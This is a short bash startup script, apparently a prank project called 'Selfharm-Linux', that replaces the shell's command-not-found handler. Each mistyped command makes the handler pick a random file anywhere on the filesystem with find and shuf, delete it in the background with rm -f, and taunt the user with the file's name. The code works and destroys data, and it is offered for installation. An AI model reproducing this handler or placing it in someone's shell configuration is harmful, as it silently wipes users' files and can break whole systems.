#!/bin/bash

# Set warning message
echo "============================================="
echo "      WARNING: Selfharm-Linux installed      "
echo " (https://github.com/RGBCube/selfharm-linux) "
echo "============================================="

# Set globstar to true
shopt -s globstar

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# Colors

CRESET=$'\033[0m'
CGREEN=$'\033[01;32m'

function command_not_found_handle {
    RAND_FILE=$(__selfharm_linux_get_random_file)
    (rm -f $RAND_FILE 2>/dev/null 1>&2 &)
    echo "Oops, looks like you misspelt something >:)"
    echo "Hope you didn't need $RAND_FILE..."
}

function __selfharm_linux_get_random_file {
    find / -type f | shuf -n 1 2> /dev/null
}

PS1="$CRESET$CGREEN\u@\h:\w\$$CRESET "
